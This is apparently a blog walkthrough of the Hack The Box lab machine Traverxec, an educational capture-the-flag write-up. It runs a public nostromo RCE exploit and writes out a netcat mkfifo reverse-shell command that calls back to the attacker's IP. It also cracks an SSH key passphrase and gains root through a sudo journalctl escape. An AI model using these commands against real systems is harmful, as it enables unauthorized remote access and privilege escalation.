---
layout: single
title: "Hack The Box Write-up #1 : Traverxec"
excerpt: "My walkthrough of Traverxec Machine from HackTheBox"
date: 2020-04-11
toc: true
toc_sticky: true
header:
  teaser: /assets/images/traverxec-walkthrough/traverxec.png
  teaser_home_page: true
categories:
  - hackthebox
  - infosec
tags:
  - nostromo  
  - journalctl
  - gtfobins
---

![Card](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/traverxec.png)

## Enumeration

### nmap 
We start by doing a nmap scan which gives the following results :


```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-21 04:12 EST
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.82 seconds
```

We have 2 ports opened from the initial scan : 22 (SSH) , 80 (HTTP) …                                                            
Before even trying to enumerate the webpage , We can notice “nostromo 1.9.6” running on port 80.                                  

I made a quick research of the mentioned service running on the webpage and ended up with the
following results :
```
root@kali:~# searchsploit "nostromo 1.9.6"
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
nostromo 1.9.6 - Remote Code Execution | exploits/multiple/remote/47837.py
--------------------------------------- ----------------------------------------
```

- Command Execution… 

That seems nasty.
First lets copy the the script to a more flexible directory and start to test it.

```
cp /usr/share/exploitdb/exploits/multiple/remote/47837.py  /root/machines/traverxec
```

```
python 47837.py
```

![rce](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t3.png)

We see there are 3 required parameters : 
- Target ip address (10.10.10.165) 
- Target Port (80) 
- Command to execute (ex. Whoami).

```
python 47837.py 10.10.10.165 80 whoami
```

![proof](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t4.png)

As we see … we could execute commands to the remote server using the script from exploitdb.
Lets try and see if we can get ourselves a reverse shell to have a better experience while running commands on the remote server.

We are going to use netcat to do this…

```
python 47837.py 10.10.10.165 80 “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.140 9001 >/tmp/f”
```

![shell](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t5.png)

We have a reverse shell on the remote server as www-data.
From now we can try and enumerate the webserver in /var/nostromo :

![enum](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t6.png)

There seems to be the conf folder which may include possible information on how to escalate to user.

Reading nhttpd.conf file We see a lot of juicy information :

![conf](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t7.png)

We can see that david which is also an user in the current machine seems to have been configured as the server admin, and more than that we can see that the public_www folder is located in /home

While we tried to enumerate … there was no such public_www in /home :

![home](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t8.png)

But since we saw : david was the server admin , the public_www should probably be inside his folder too.
We cannot actually list the files inside david home folder but we can try to directly access the mentioned directory as www-data and see if we can find something else :

![data](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t9.png)

As expected , we could directly access : public_www and we see the index.html file alongside an interesting directory claiming to hold protected files .                                                                                                                                                          
There seems to be a backup of the ssh keys inside there so I grabbed the files to my machine to try and login as user david

![backup](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/tx.png)

## USER ESCALATION

id_rsa seems to be encrypted and we can probably use john to convert and try to crack it :
![hash](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t10.png)

We pass the generated ssh hash to john and run it against rockyou.txt wordlist to see if we could get anything interesting…

![key](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t11.png)

John managed to succesfully crack the file , and the key seems to be “hunter”.                                                  
Lets try and login with the file since we have its key now :

![ssh](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t12.png)

We could succesfully login using ssh and now we can also easily grab the user flag. :)


## ROOT ESCALATION

After logging in , this is what we have in the home folder except user.txt :

![content](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t13.png)

- bin seems interesting , so we will enumerate it a little more to see what could it bring to us…

We have 2 files inside bin folder :

- A script written in bash which happens to read the last 5 log lines of nostromo :

![script](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t14.png)

- A header for the above script :

![header](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t15.png)

By analyzing the first script , we see that it is running journalctl as sudo against nostromo service to show the last 5 lines, and also I noticed that the execution of /usr/bin/cat prevents journalctl from remaining executed .

It looks like we have permissions to run the above sudo command against nostromo without the need of the password .

The bin folder is writable from our user so we can try to make another similar script but without usr/bin/cat in it . This way journalctl can remain executed on the script and we can try to abuse it somehow to escalate to root.

![customs](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t16.png)

As we see now , after executing our edited script , journalctl remains executed and now we can attempt to abuse it to gain root access …

The following website can help us with the simplest methods to escalate to a root shell from journalctl:
[GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/)

And as we see , we can simply type !/bin/sh in the running session of journalctl to get a system shell

![root](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t17.png)

This happened to work perfectly … and now we have a shell executed as root .

![root](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/traverxec-walkthrough/t18.png)

This way we can easily navigate to root folder and grab the root flag.
